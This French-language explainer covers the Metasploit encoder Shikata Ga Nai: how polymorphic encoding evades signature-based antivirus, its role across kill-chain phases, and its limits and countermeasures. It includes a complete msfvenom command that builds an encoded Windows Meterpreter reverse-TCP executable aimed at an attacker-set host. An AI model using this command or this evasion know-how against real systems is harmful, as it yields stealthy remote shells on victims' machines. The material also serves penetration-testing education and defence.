# Shikata Ga Nai (Encoder Polymorphique Metasploit) : Évasion et Persistance

Dans le contexte du hacking et des tests d'intrusion, **Shikata Ga Nai** n'est pas un outil autonome comme `ping` ou `nslookup`. C'est un **encoder polymorphique** de haut niveau intégré au framework **Metasploit**. Son objectif principal est de rendre les charges utiles (payloads) indétectables par les logiciels antivirus (AV) et les systèmes de détection d'intrusion (IDS/IPS) en changeant leur "signature" à chaque fois qu'elles sont générées.

Le nom "Shikata Ga Nai" (仕方がない) est une phrase japonaise signifiant "il n'y a rien à faire", "on ne peut rien y faire", ou "c'est comme ça". Dans ce contexte, cela peut impliquer l'idée que face à cet encodeur, les systèmes de défense sont démunis.

-----

## Qu'est-ce qu'un Encodeur Polymorphique?

Un encodeur polymorphique est un algorithme qui prend un morceau de code (votre payload, par exemple) et le transforme de telle sorte que :

1.  Le code encodé est différent à chaque génération, même si le payload original est le même.
2.  Le code encodé conserve sa fonctionnalité originale lorsqu'il est décodé et exécuté.
3.  Il inclut un petit "stub" (décodeur) qui est responsable de décoder le payload encodé au moment de l'exécution sur la machine cible. Ce stub lui-même peut aussi être polymorphique.

L'objectif est d'échapper à la détection basée sur les signatures. Si un antivirus a une signature pour un payload spécifique, un encodeur polymorphique va modifier ce payload de manière unique, le rendant méconnaissable pour la signature existante, tout en garantissant qu'il fonctionne toujours une fois décodé en mémoire.

-----

## Comment Fonctionne Shikata Ga Nai?

Shikata Ga Nai est un encodeur complexe qui utilise des techniques sophistiquées pour altérer la charge utile :

1.  **Encodage Multi-passes :** Il applique plusieurs passes d'encodage différentes. Chaque passe modifie la charge utile d'une manière unique.
2.  **Opérations Arithmétiques/Logiques :** Il insère des opérations inutiles ou des réorganisations de code qui n'affectent pas la logique finale, mais qui changent la signature binaire du payload.
3.  **Instruction Set Randomization :** Il peut utiliser différentes instructions CPU pour accomplir la même tâche, rendant le code plus difficile à analyser statiquement.
4.  **Stub Polymorphique :** Le petit morceau de code (le "stub" ou "shellcode decoder") qui est inclus avec le payload encodé pour le décoder au moment de l'exécution est lui-même polymorphique. Cela signifie que le décodeur est également modifié à chaque génération, ce qui rend la détection encore plus difficile.

**En pratique, dans Metasploit :**
Lorsque vous générez un payload avec `msfvenom` (l'outil de génération de payloads de Metasploit) ou que vous utilisez un exploit dans `msfconsole`/`Armitage`, vous pouvez spécifier un encodeur. Si vous choisissez `shikata_ga_nai` (généralement `x86/shikata_ga_nai` pour les architectures 32-bit), Metasploit appliquera cet encodage à votre payload avant de l'envoyer à la cible.

**Exemple d'utilisation avec `msfvenom` :**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<votre_IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe
```

Dans cet exemple :

  * `-p windows/meterpreter/reverse_tcp` : Le payload original (Meterpreter reverse TCP pour Windows).
  * `-e x86/shikata_ga_nai` : Spécifie l'encodeur Shikata Ga Nai pour architecture x86.
  * `-i 5` : Applique l'encodage 5 fois (plus d'itérations = plus de polymorphisme, mais aussi une taille de payload plus grande).
  * `-f exe` : Formate le payload en fichier exécutable Windows.
  * `-o encoded_payload.exe` : Nom du fichier de sortie.

-----

## Place de Shikata Ga Nai dans les Étapes de Hacking

Shikata Ga Nai est spécifiquement utilisé dans la phase d'**Armement (Weaponization)** et d'**Accès Initial (Delivery/Exploitation)** de la Cyber Kill Chain, ainsi que pour la **persistance** et l'**évasion**.

| Phase de Hacking | Rôle de `Shikata Ga Nai`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| :---------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1. Reconnaissance | Non directement impliqué. Cette phase se concentre sur la collecte d'informations.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| 2. Armement (Weaponization) | C'est la phase où les attaquants créent leurs outils d'attaque. Shikata Ga Nai est utilisé ici pour **encoder et obscurcir les payloads** générés par Metasploit. Le but est de rendre l'arme (le fichier malveillant, le lien d'exploit) indétectable par les défenses antivirus/EDR, en vue de la livraison et de l'exploitation. Il modifie le shellcode afin qu'il ne soit pas reconnu par les signatures de sécurité connues.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| 3. Livraison (Delivery) | Le payload encodé avec Shikata Ga Nai est livré à la cible (par e-mail, via une clé USB, un site web malveillant, etc.). La phase de livraison elle-même ne concerne pas Shikata Ga Nai directement, mais la capacité du payload à échapper à la détection lors de la livraison dépend de son encodage.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| 4. Exploitation | Lorsque la vulnérabilité est exploitée et que le payload encodé est exécuté sur la cible, Shikata Ga Nai joue son rôle. Le décodeur inclus dans le payload encodé s'exécute, décode le payload original en mémoire, et permet ainsi à la fonctionnalité malveillante de s'activer sans être détectée par les mécanismes de sécurité basés sur la signature qui auraient pu scanner le fichier sur le disque. |
| 5. Installation (Persistance) | Les payloads encodés avec Shikata Ga Nai peuvent être utilisés pour établir des mécanismes de persistance sur la machine compromise (par exemple, en créant une backdoor qui se lance au démarrage). L'encodage aide la backdoor à rester indétectable sur le disque.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| 6. Commande et Contrôle (C2) | Une fois la session établie (par exemple, un shell Meterpreter), les communications C2 ne sont pas directement encodées par Shikata Ga Nai, mais la furtivité de la session initiale et de la persistance contribue à la mise en place d'un canal C2 stable et indétecté.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |

-----

## Limites et Contre-mesures (Via Gemini)

Bien que puissant, Shikata Ga Nai n'est pas une solution miracle et a ses limites :

  * **Détection Heuristique et Comportementale :** Les antivirus modernes utilisent des analyses heuristiques et comportementales, qui peuvent détecter des activités suspectes (le décodeur en train de s'exécuter, le processus qui se crée) même si la signature binaire est inconnue.
  * **Augmentation de la Taille :** L'encodage polymorphique augmente la taille du payload, ce qui peut rendre certaines techniques de livraison moins efficaces.
  * **Complexité de l'Environnement :** Sur des systèmes très sécurisés avec EDR (Endpoint Detection and Response) avancés, l'efficacité de Shikata Ga Nai peut être réduite.
  * **Non-persistance sur le Disque :** Il s'agit d'un encodage de runtime. Une fois décodé en mémoire, le payload est à nouveau en clair et peut être détecté par des scans de mémoire.

**Contre-mesures :**
Les défenses contre Shikata Ga Nai et des encodeurs similaires incluent :

  * **Analyse Comportementale :** Se concentrer sur le comportement du code plutôt que sur sa signature.
  * **Sandboxing :** Exécuter le code dans un environnement isolé pour observer son comportement avant qu'il n'atteigne le système réel.
  * **Restrictions d'Exécution :** Mettre en place des politiques (comme AppLocker sur Windows) pour n'autoriser l'exécution que de logiciels de confiance.
  * **Mises à jour Régulières :** Les signatures antivirus sont constamment mises à jour pour détecter les nouvelles variantes de stubs polymorphiques.

